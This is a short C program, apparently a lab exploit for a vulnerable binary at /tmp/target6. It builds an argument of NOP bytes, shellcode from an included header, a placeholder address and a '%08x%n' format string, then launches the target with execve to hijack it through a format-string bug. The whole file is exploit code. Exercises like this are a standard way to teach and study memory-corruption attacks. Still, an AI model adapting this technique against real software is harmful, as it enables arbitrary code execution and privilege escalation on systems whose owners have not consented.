#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"

int main(void)
{
  char *args[3];
  char *env[1];
  char *format;

  args[0] = TARGET; 
  args[1] = malloc(256);
  memset(args[1], 0x90, 255);
  *(unsigned int *)(args[1]+255) = 0x00;

  *(unsigned int *)(args[1]) = 0xaaaaaaaa;
  memcpy(args[1]+4, shellcode, strlen(shellcode));
  format = "%08x%n";
  memcpy(args[1]+4+strlen(shellcode), format, strlen(format));

  args[2] = NULL;

  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
